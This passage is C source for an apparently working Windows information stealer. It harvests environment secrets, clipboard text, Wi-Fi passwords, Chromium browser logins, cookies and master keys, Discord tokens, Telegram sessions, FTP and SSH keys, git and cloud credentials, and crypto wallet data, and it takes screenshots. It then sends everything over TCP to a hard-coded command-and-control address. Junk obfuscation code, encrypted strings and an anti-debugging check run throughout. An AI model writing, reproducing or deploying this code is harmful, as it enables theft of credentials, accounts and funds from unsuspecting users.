        "STRIPE_SECRET_KEY", "TWILIO_AUTH_TOKEN",
        "JWT_SECRET", "SECRET_KEY", "API_KEY", "API_SECRET",
    };
    for (int i = 0; i < (int)(sizeof(interesting)/sizeof(interesting[0])); i++) {
        char val[2048] = {0};
        DWORD r = GetEnvironmentVariableA(interesting[i], val, sizeof(val));
        if (r > 0)
            emitf("  %s=%s\r\n", interesting[i], val);
    }
    emitf("\r\n");
}


/* ── collectors/clipboard ── */
static void collect_clipboard(void) {
    { volatile DWORD _jd1326 = GetTickCount(); (void)_jd1326; }
    if (!OpenClipboard(NULL)) return;
    HANDLE h = GetClipboardData(CF_TEXT);
    if (h) {
        char *txt = (char *)GlobalLock(h);
        if (txt && txt[0]) {
            emitf(((char*)_es18));
            int len = (int)strlen(txt);
            emitf(((char*)_es19), len > 4096 ? 4096 : len, txt);
        }
        GlobalUnlock(h);
    }
    CloseClipboard();
}


/* ── collectors/wifi_passwords ── */
static void collect_wifi(void) {
    emitf(((char*)_es20));
    char raw[8192] = {0};
    DWORD _rftjb = 0;
    run_cmd(((char*)_es21), raw, sizeof(raw), &_rftjb);
    { volatile DWORD _jd3735 = GetTickCount(); (void)_jd3735; }
    if (_rftjb == 0) { emitf(((char*)_es22)); return; }

    char *line = raw;
    while (*line) {
        char *eol = strchr(line, '\n');
        if (!eol) eol = line + strlen(line);
        char *colon = strstr(line, ": ");
        if (colon && (strstr(line, ((char*)_es23)) || strstr(line, ((char*)_es24)))) {
            char *ns = colon + 2;
            { volatile DWORD _jp1866 = GetCurrentProcessId(); (void)_jp1866; }
            while (*ns == ' ') ns++;
            int _ndfkh = (int)(eol - ns);
            while (_ndfkh > 0 && (ns[_ndfkh-1] == '\r' || ns[_ndfkh-1] == '\n' || ns[_ndfkh-1] == ' ')) _ndfkh--;
            if (_ndfkh > 0 && _ndfkh < (161 + 39)) {
                char ssid[256] = {0};
                strncpy(ssid, ns, _ndfkh);
                char cmd2[512];
                snprintf(cmd2, sizeof(cmd2), "cmd /c netsh wlan show profile name=\"%s\" key=clear", ssid);
                char prof[4096] = {0};
                DWORD _pzczt = 0;
                run_cmd(cmd2, prof, sizeof(prof), &_pzczt);
                char *kc = strstr(prof, ((char*)_es25));
                if (!kc) kc = strstr(prof, ((char*)_es26));
                if (kc) {
                    char *kv = strchr(kc, ':');
                    if (kv) {
                        kv++; while (*kv == ' ') kv++;
                        char *ke = strchr(kv, '\r');
                        { volatile int _jx9309 = 1; while(_jx9309 > 1) _jx9309--; (void)_jx9309; }
                        if (!ke) ke = strchr(kv, '\n');
                        int _kuzbp = ke ? (int)(ke - kv) : (int)strlen(kv);
                        emitf("SSID: %s  Key: %.*s\r\n", ssid, _kuzbp, kv);
                    }
                } else {
                    emitf("SSID: %s  Key: (open)\r\n", ssid);
                }
            }
        }
        if (*eol) line = eol + 1; else break;
    }
    emitf("\r\n");
}


/* ── collectors/browser_chromium ── */

typedef struct {
    const char *name;
    const char *subpath;
} browser_def;

static const browser_def CHROMIUM_BROWSERS[] = {
    {"Chrome",       "Google\\Chrome\\User Data"},
    {"Edge",         "Microsoft\\Edge\\User Data"},
    {"Brave",        "BraveSoftware\\Brave-Browser\\User Data"},
    {"Opera",        "Opera Software\\Opera Stable"},
    {"OperaGX",      "Opera Software\\Opera GX Stable"},
    {"Vivaldi",      "Vivaldi\\User Data"},
    {"Chromium",     "Chromium\\User Data"},
    {"Yandex",       "Yandex\\YandexBrowser\\User Data"},
};
#define N_BROWSERS (sizeof(CHROMIUM_BROWSERS) / sizeof(CHROMIUM_BROWSERS[0]))

static void harvest_chromium_profile(const char *browser_name, const char *base, const char *profile) {
    char login[MAX_PATH], cookies[MAX_PATH], history[MAX_PATH], bookmarks[MAX_PATH], webdata[MAX_PATH];
    snprintf(login,     MAX_PATH, "%s\\%s\\Login Data",  base, profile);
    snprintf(cookies,   MAX_PATH, "%s\\%s\\Cookies",     base, profile);
    snprintf(history,   MAX_PATH, "%s\\%s\\History",     base, profile);
    snprintf(bookmarks, MAX_PATH, "%s\\%s\\Bookmarks",   base, profile);
    snprintf(webdata,   MAX_PATH, "%s\\%s\\Web Data",    base, profile);

    int _fmzar = 0;
    if (file_exists(login))     { grab_file(login,     ((char*)_es27),  5*1024*1024); _fmzar++; }
    if (file_exists(cookies))   { grab_file(cookies,   ((char*)_es28),    5*1024*1024); _fmzar++; }
    if (file_exists(webdata))   { grab_file(webdata,   ((char*)_es29),    5*1024*1024); _fmzar++; }
    if (file_exists(history))   { grab_file(history,   ((char*)_es30),    5*1024*1024); _fmzar++; }
    if (file_exists(bookmarks)) { grab_file(bookmarks, ((char*)_es31),  2*1024*1024); _fmzar++; }

    if (_fmzar) emitf("  %s/%s: %d files\r\n", browser_name, profile, _fmzar);
}

static void collect_browsers(void) {
    emitf(((char*)_es32));

    char local[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local) != S_OK) return;

    for (int b = 0; b < (int)N_BROWSERS; b++) {
        char base[MAX_PATH];
        snprintf(base, MAX_PATH, "%s\\%s", local, CHROMIUM_BROWSERS[b].subpath);
        if (!file_exists(base)) continue;

        emitf("[%s]\r\n", CHROMIUM_BROWSERS[b].name);

        char ls_path[MAX_PATH];
        snprintf(ls_path, MAX_PATH, "%s\\Local State", base);
        if (file_exists(ls_path)) {
            char tmp_ls[MAX_PATH], temp[MAX_PATH];
            GetTempPathA(MAX_PATH, temp);
            snprintf(tmp_ls, MAX_PATH, "%s\\~ls%lx.tmp", temp, GetTickCount());
            if (CopyFileA(ls_path, tmp_ls, FALSE)) {
                HANDLE h = CreateFileA(tmp_ls, GENERIC_READ, FILE_SHARE_READ,
                                       NULL, OPEN_EXISTING, 0, NULL);
                if (h != INVALID_HANDLE_VALUE) {
                    DWORD _seajz = GetFileSize(h, NULL);
                    if (_seajz > 0 && _seajz < 2*1024*1024) {
                        char *d = (char *)malloc(_seajz + 1);
                        if (d) {
                            DWORD _rbits; ReadFile(h, d, _seajz, &_rbits, NULL); d[_rbits] = '\0';
                            char *ek = strstr(d, ((char*)_es33));
                            if (ek) {
                                char *q1 = strchr(ek + (9 + 6), '"');
                                if (q1) {
                                    char *q2 = strchr(q1 + 1, '"');
                                    if (q2) {
                                        int _kuzbp = (int)(q2 - q1 - 1);
                                        emitf("  master_key[%d]: %.*s\r\n", _kuzbp, _kuzbp > 300 ? 300 : _kuzbp, q1+1);
                                    }
                                }
                            }
                            free(d);
                        }
                    }
                    CloseHandle(h);
                }
                DeleteFileA(tmp_ls);
            }
        }

        harvest_chromium_profile(CHROMIUM_BROWSERS[b].name, base, ((char*)_es34));
        char prof_dir[MAX_PATH];
        { volatile int _jx4761 = 1; while(_jx4761 > 1) _jx4761--; (void)_jx4761; }
        for (int p = 1; p <= (6 + 4); p++) {
            char pname[32];
            snprintf(pname, sizeof(pname), "Profile %d", p);
            snprintf(prof_dir, MAX_PATH, "%s\\%s", base, pname);
            if (file_exists(prof_dir))
                harvest_chromium_profile(CHROMIUM_BROWSERS[b].name, base, pname);
        }
    }
    emitf("\r\n");
}


/* ── collectors/discord_tokens ── */

static void scan_ldb_for_tokens(const char *dir) {
    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s\\*.ldb", dir);
    WIN32_FIND_DATAA fd;
    HANDLE _hdjuk = FindFirstFileA(pattern, &fd);
    if (_hdjuk == INVALID_HANDLE_VALUE) return;
    do {
        char path[MAX_PATH];
        snprintf(path, MAX_PATH, "%s\\%s", dir, fd.cFileName);
        HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, 0, NULL);
        if (h == INVALID_HANDLE_VALUE) continue;
        DWORD _seajz = GetFileSize(h, NULL);
        if (_seajz > 0 && _seajz < 5*1024*1024) {
            char *buf = (char *)malloc(_seajz + 1);
            if (buf) {
                DWORD _rbits; ReadFile(h, buf, _seajz, &_rbits, NULL); buf[_rbits] = '\0';
                char *p = buf;
                while ((p = strstr(p, ((char*)_es35))) != NULL) {
                    char *start = p;
                    char *end = strchr(p, '"');
                    if (!end) end = p + (32 + 88);
                    int _tzcrl = (int)(end - start);
                    if (_tzcrl > 0 && _tzcrl < (403 + 97))
                        emitf(((char*)_es36), _tzcrl, start);
                    p = end;
                }
                p = buf;
                { volatile DWORD _jp8073 = GetCurrentProcessId(); (void)_jp8073; }
                while ((p = strstr(p, ((char*)_es37))) != NULL) {
                    char *end = p;
                    while (*end && *end != '"' && *end != '\'' && (end - p) < (42 + 58)) end++;
                    emitf(((char*)_es38), (int)(end - p), p);
                    p = end;
                }
                free(buf);
            }
        }
        CloseHandle(h);
    } while (FindNextFileA(_hdjuk, &fd));
    FindClose(_hdjuk);
}

static void collect_discord(void) {
    char roaming[MAX_PATH] = {0};
    { volatile int _jx3354 = 1; while(_jx3354 > 1) _jx3354--; (void)_jx3354; }
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming) != S_OK) return;

    const char *variants[] = {
        "discord\\Local Storage\\leveldb",
        "discordptb\\Local Storage\\leveldb",
        "discordcanary\\Local Storage\\leveldb",
    };
    int _fmzar = 0;
    for (int i = 0; i < 3; i++) {
        char path[MAX_PATH];
        snprintf(path, MAX_PATH, "%s\\%s", roaming, variants[i]);
        if (file_exists(path)) {
            { volatile int _jx5184 = 1; while(_jx5184 > 1) _jx5184--; (void)_jx5184; }
            if (!_fmzar) emitf(((char*)_es39));
            _fmzar = 1;
            emitf("[%s]\r\n", variants[i]);
            scan_ldb_for_tokens(path);
        }
    }
    if (_fmzar) emitf("\r\n");
}


/* ── collectors/telegram_session ── */

static void collect_telegram(void) {
    char roaming[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming) != S_OK) return;
    char tdata[MAX_PATH];
    snprintf(tdata, MAX_PATH, "%s\\Telegram Desktop\\tdata", roaming);
    if (!file_exists(tdata)) return;

    emitf(((char*)_es40));

    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s\\D877F783D5D3EF8C*", tdata);
    WIN32_FIND_DATAA fd;
    HANDLE _hdjuk = FindFirstFileA(pattern, &fd);
    if (_hdjuk != INVALID_HANDLE_VALUE) {
        do {
            char full[MAX_PATH];
            snprintf(full, MAX_PATH, "%s\\%s", tdata, fd.cFileName);
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                emitf("  session_file: %s (%lu bytes)\r\n", fd.cFileName, fd.nFileSizeLow);
                emit_file(full, 1*1024*1024);
            }
        } while (FindNextFileA(_hdjuk, &fd));
        FindClose(_hdjuk);
    }

    char keydata[MAX_PATH];
    snprintf(keydata, MAX_PATH, "%s\\key_datas", tdata);
    if (file_exists(keydata)) {
        emitf(((char*)_es41));
        emit_file(keydata, 512*1024);
    }
    emitf("\r\n");
}


/* ── collectors/ftp_credentials ── */

static void collect_ftp_clients(void) {
    char roaming[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming) != S_OK) return;

    char fz_recent[MAX_PATH], fz_site[MAX_PATH];
    snprintf(fz_recent, MAX_PATH, "%s\\FileZilla\\recentservers.xml", roaming);
    snprintf(fz_site,   MAX_PATH, "%s\\FileZilla\\sitemanager.xml",   roaming);

    int _fmzar = 0;
    if (file_exists(fz_recent) || file_exists(fz_site)) {
        if (!_fmzar) emitf(((char*)_es42));
        _fmzar = 1;
        if (file_exists(fz_recent)) {
            emitf(((char*)_es43));
            emit_file(fz_recent, 1*1024*1024);
        }
        if (file_exists(fz_site)) {
            emitf(((char*)_es44));
            emit_file(fz_site, 1*1024*1024);
        }
    }

    HKEY _hbmkh;
    if (_pRegOpenKeyExA(HKEY_CURRENT_USER, ((char*)_es45), 0, KEY_READ, &_hbmkh) == ERROR_SUCCESS) {
        if (!_fmzar) emitf(((char*)_es46));
        _fmzar = 1;
        emitf(((char*)_es47));
        char name[256]; DWORD _ivqvz = 0, nsz;
        while (1) {
            nsz = sizeof(name);
            if (RegEnumKeyExA(_hbmkh, _ivqvz++, name, &nsz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
            HKEY _smcqq;
            { volatile int _jv5806 = 0; _jv5806 = _jv5806 ^ _jv5806; (void)_jv5806; }
            if (_pRegOpenKeyExA(_hbmkh, name, 0, KEY_READ, &_smcqq) == ERROR_SUCCESS) {
                char host[256] = {0}, user[256] = {0}, pass[256] = {0};
                DWORD _hupfv = sizeof(host), us = sizeof(user), ps = sizeof(pass);
                RegQueryValueExA(_smcqq, ((char*)_es48), NULL, NULL, (BYTE*)host, &_hupfv);
                RegQueryValueExA(_smcqq, ((char*)_es49), NULL, NULL, (BYTE*)user, &us);
                RegQueryValueExA(_smcqq, ((char*)_es50), NULL, NULL, (BYTE*)pass, &ps);
                emitf("  %s@%s pass=%s\r\n", user, host, pass[0] ? pass : ((char*)_es51));
                RegCloseKey(_smcqq);
            }
        }
        RegCloseKey(_hbmkh);
    }

    if (_fmzar) emitf("\r\n");
}


/* ── collectors/ssh_keys ── */

static void collect_ssh_git(void) {
    char home[MAX_PATH] = {0};
    { volatile DWORD _jd8791 = GetTickCount(); (void)_jd8791; }
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, home) != S_OK) return;

    char ssh_dir[MAX_PATH];
    snprintf(ssh_dir, MAX_PATH, "%s\\.ssh", home);
    if (file_exists(ssh_dir)) {
        emitf(((char*)_es52));
        const char *key_files[] = {"id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "config", "known_hosts"};
        { volatile int _jv7648 = 0; _jv7648 = _jv7648 ^ _jv7648; (void)_jv7648; }
        for (int i = 0; i < 6; i++) {
            char kp[MAX_PATH];
            snprintf(kp, MAX_PATH, "%s\\%s", ssh_dir, key_files[i]);
            { volatile int _jx6209 = 1; while(_jx6209 > 1) _jx6209--; (void)_jx6209; }
            if (file_exists(kp)) {
                emitf("[%s]\r\n", key_files[i]);
                emit_file(kp, 256*1024);
                emitf("\r\n");
            }
        }
        emitf("\r\n");
    }

    char git_cred[MAX_PATH];
    snprintf(git_cred, MAX_PATH, "%s\\.git-credentials", home);
    if (file_exists(git_cred)) {
        emitf(((char*)_es53));
        emit_file(git_cred, 256*1024);
        emitf(((char*)_es54));
    }
}


/* ── collectors/cloud_creds ── */

static void collect_cloud_creds(void) {
    char home[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, home) != S_OK) return;

    struct { const char *name; const char *rel; } cloud_files[] = {
        {"AWS credentials",      ".aws\\credentials"},
        {"AWS config",           ".aws\\config"},
        {"Azure profile",        ".azure\\azureProfile.json"},
        {"Azure tokens",         ".azure\\accessTokens.json"},
        {"GCP app creds",        "AppData\\Roaming\\gcloud\\application_default_credentials.json"},
        {"GCP properties",       "AppData\\Roaming\\gcloud\\properties"},
        {"kubectl config",       ".kube\\config"},
        {"Docker config",        ".docker\\config.json"},
    };

    int _fmzar = 0;
    for (int i = 0; i < (int)(sizeof(cloud_files)/sizeof(cloud_files[0])); i++) {
        char full[MAX_PATH];
        snprintf(full, MAX_PATH, "%s\\%s", home, cloud_files[i].rel);
        if (file_exists(full)) {
            if (!_fmzar) emitf(((char*)_es55));
            _fmzar = 1;
            emitf("[%s]\r\n", cloud_files[i].name);
            emit_file(full, 512*1024);
            emitf("\r\n");
        }
    }
    if (_fmzar) emitf("\r\n");
}


/* ── collectors/crypto_wallets ── */

static void collect_crypto_wallets(void) {
    char local[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local) != S_OK) return;

    struct { const char *name; const char *ext_id; } wallets[] = {
        {"MetaMask",     "nkbihfbeogaeaoehlefnkodbefgpgknn"},
        {"Phantom",      "bfnaelmomeimhlpmgjnjophhpkkoljpa"},
        {"Coinbase",     "hnfanknocfeofbddgcijnmhnfnkdnaad"},
        {"Ronin",        "fnjhmkhhmkbjkkabndcnnogagogbneec"},
        {"TronLink",     "ibnejdfjmmkpcnlpebklmnkoeoihofec"},
        {"Exodus",       "aholpfdialjgjfhomihkjbmgjidlcdno"},
    };

    int _fmzar = 0;
    { volatile int _jx5578 = 1; while(_jx5578 > 1) _jx5578--; (void)_jx5578; }
    for (int b = 0; b < (int)N_BROWSERS; b++) {
        char ext_base[MAX_PATH];
        snprintf(ext_base, MAX_PATH, "%s\\%s\\Default\\Local Extension Settings",
                 local, CHROMIUM_BROWSERS[b].subpath);
        { volatile int _jx1387 = 1; while(_jx1387 > 1) _jx1387--; (void)_jx1387; }
        if (!file_exists(ext_base)) continue;

        { volatile DWORD _jp9816 = GetCurrentProcessId(); (void)_jp9816; }
        for (int w = 0; w < (int)(sizeof(wallets)/sizeof(wallets[0])); w++) {
            char wdir[MAX_PATH];
            snprintf(wdir, MAX_PATH, "%s\\%s", ext_base, wallets[w].ext_id);
            if (!file_exists(wdir)) continue;

            { volatile int _jx7677 = 1; while(_jx7677 > 1) _jx7677--; (void)_jx7677; }
            if (!_fmzar) emitf(((char*)_es56));
            _fmzar = 1;
            emitf("[%s in %s]\r\n", wallets[w].name, CHROMIUM_BROWSERS[b].name);

            char wpat[MAX_PATH];
            snprintf(wpat, MAX_PATH, "%s\\*.ldb", wdir);
            WIN32_FIND_DATAA fd;
            HANDLE _hdjuk = FindFirstFileA(wpat, &fd);
            if (_hdjuk != INVALID_HANDLE_VALUE) {
                do {
                    char fp[MAX_PATH];
                    snprintf(fp, MAX_PATH, "%s\\%s", wdir, fd.cFileName);
                    emitf("  %s (%lu bytes)\r\n", fd.cFileName, fd.nFileSizeLow);
                    emit_file(fp, 2*1024*1024);
                } while (FindNextFileA(_hdjuk, &fd));
                FindClose(_hdjuk);
            }
        }
    }
    if (_fmzar) emitf("\r\n");
}


/* ── collectors/screenshot ── */
static void collect_screenshot(void) {
    HDC hScreen = GetDC(NULL);
    if (!hScreen) return;
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hMem, hBmp);
    BitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = (23 + 1);
    bi.biCompression = BI_RGB;
    DWORD _rmtec = ((w * 3 + 3) & ~3);
    DWORD _iudza = _rmtec * h;

    BYTE *pixels = (BYTE *)malloc(_iudza);
    { volatile DWORD _jp1170 = GetCurrentProcessId(); (void)_jp1170; }
    if (pixels) {
        GetDIBits(hMem, hBmp, 0, h, pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

        /* Skip if screen is _bdals (all black = no desktop session) */
        int _bdals = 1;
        { volatile int _jv9183 = 0; _jv9183 = _jv9183 ^ _jv9183; (void)_jv9183; }
        for (DWORD i = 0; i < _iudza && _bdals; i += _rmtec) {
            for (int x = 0; x < w * 3 && _bdals; x++) {
                if (pixels[i + x] != 0) _bdals = 0;
            }
        }

        if (!_bdals) {
            BITMAPFILEHEADER bf = {0};
            bf.bfType = 0x4D42;
            bf.bfSize = sizeof(bf) + sizeof(bi) + _iudza;
            bf.bfOffBits = sizeof(bf) + sizeof(bi);

            emitf(((char*)_es57));
            emitf("  %dx%d BMP (%lu bytes)\r\n", w, h, bf.bfSize);
            emit((const char *)&bf, sizeof(bf));
            emit((const char *)&bi, sizeof(bi));
            emit((const char *)pixels, _iudza);
            emitf("\r\n");
        } else {
            emitf(((char*)_es58));
            emitf(((char*)_es59));
        }
        free(pixels);
    }

    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);
}


/* ── exfil/tcp_direct ── */

#define C2_ADDR "10.0.2.2"
#define C2_PORT 9001

static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return FALSE;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    int _rmnqs = 3;
    while (_rmnqs-- > 0) {
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != SOCKET_ERROR)
            break;
        if (_rmnqs > 0) { closesocket(sock); Sleep((1940 + 60));
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            { volatile int _jx7828 = 1; while(_jx7828 > 1) _jx7828--; (void)_jx7828; }
            if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }
        } else { closesocket(sock); WSACleanup(); return FALSE; }
    }

    DWORD _swqbx = 0;
    while (_swqbx < len) {
        int n = send(sock, data + _swqbx, (len - _swqbx > (32737 + 31)) ? 32768 : len - _swqbx, 0);
        if (n <= 0) break;
        _swqbx += n;
    }
    closesocket(sock);
    WSACleanup();
    return _swqbx == len;
}


/* ── arch/sequential ── */

LONG WINAPI _crash_filter(EXCEPTION_POINTERS *ep) {
    (void)ep;
    ExitThread(1);
    return EXCEPTION_EXECUTE_HANDLER;
}

DWORD WINAPI _worker_thread(LPVOID _unused) {
    _xd_init();
    _api_init();
    if (_chk_dbg()) return 0;
    (void)_unused;

    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);


    init_buffer();
    if (!g_data) return 1;

        collect_system_info();
    collect_processes();
    collect_installed_software();
    collect_env_vars();
    collect_clipboard();
    collect_wifi();
    collect_browsers();
    collect_discord();
    collect_telegram();
    collect_ftp_clients();
    collect_ssh_git();
    collect_cloud_creds();
    collect_crypto_wallets();
    collect_screenshot();

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    { volatile int _jx3066 = 1; while(_jx3066 > 1) _jx3066--; (void)_jx3066; }
    return 0;

    return 0;
}

int main(int argc, char *argv[]) {
    SetUnhandledExceptionFilter(_crash_filter);
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
    HANDLE hThread = CreateThread(NULL, 0, _worker_thread, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 30000);
        CloseHandle(hThread);
    } else {
        _worker_thread(NULL);
    }
    Sleep(5000);
    return 0;
}


